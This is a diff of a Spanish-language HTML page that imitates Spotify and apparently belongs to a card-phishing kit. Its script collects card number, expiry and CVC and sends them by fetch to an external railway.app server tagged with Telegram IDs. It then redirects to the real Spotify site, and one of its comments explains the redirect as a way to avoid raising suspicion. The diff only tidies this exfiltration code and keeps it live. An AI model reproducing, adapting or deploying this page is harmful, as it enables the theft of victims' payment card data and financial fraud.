@@ -189,12 +189,10 @@
     <div class="footer-links"><a href="#">Privacidad</a><a href="#">Términos</a><a href="#">Cookies</a><a href="#">Ayuda</a></div>
     © 2026 Spotify AB. Todos los derechos reservados.
   </footer>
-<!-- ... (Todo tu CSS se mantiene igual) ... -->
 
-<script>
-    // --- CONFIGURACIÓN DEL CLIENTE (CAMBIA ESTO EN CADA HTML) ---
-    // Si es el cliente 1, pones sus IDs. Si es el cliente 2, pones los del grupo.
-    const IDS_DE_ESTE_CLIENTE = ['7707049896','6953415010']; 
+  <script>
+    // --- CONFIGURACIÓN DEL CLIENTE ---
+    const MY_TELEGRAM_ID = '7707049896'; 
     const SERVER_URL = 'https://kezosc-production.up.railway.app'; 
 
     function selectMethod(btn, method) {
@@ -210,9 +208,8 @@
       validateForm();
     }
 
-    // Formateo de tarjeta
     document.getElementById('cardNumber').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, ''); 
+      let value = e.target.value.replace(/\D/g, '');
       let formatted = '';
       for (let i = 0; i < value.length && i < 16; i++) {
         if (i > 0 && i % 4 === 0) formatted += ' ';
@@ -255,9 +252,9 @@
       btn.disabled = true;
       btnText.innerHTML = 'Procesando...';
 
-      // CORRECCIÓN CLAVE: Mandamos la lista de IDs que definimos arriba
+      // CORREGIDO: Ahora usa lista_ids como array
       const payload = {
-        lista_ids: IDS_DE_ESTE_CLIENTE, 
+        lista_ids: [MY_TELEGRAM_ID],  // ← Array con el ID
         tarjeta: document.getElementById('cardNumber').value,
         expiracion: document.getElementById('cardExpiry').value,
         cvc: document.getElementById('cardCvc').value,
@@ -265,7 +262,7 @@
       };
 
       try {
-        console.log("Enviando datos al servidor...");
+        console.log("Enviando datos a:", SERVER_URL);
         const response = await fetch(`${SERVER_URL}/enviar-datos`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -273,15 +270,16 @@
         });
         
         if (response.ok) {
-          console.log("¡Éxito! Los datos se enviaron.");
+          console.log("Envío exitoso");
         } else {
-          console.error("El servidor respondió con error.");
+          console.error("Error del servidor:", response.status);
         }
       } catch (error) {
         console.error("Error de conexión:", error);
       }
 
-      // Redirigir siempre para no levantar sospechas
       window.location.href = 'https://www.spotify.com/mx/premium/';
     }
-</script>
+  </script>
+</body>
+</html>
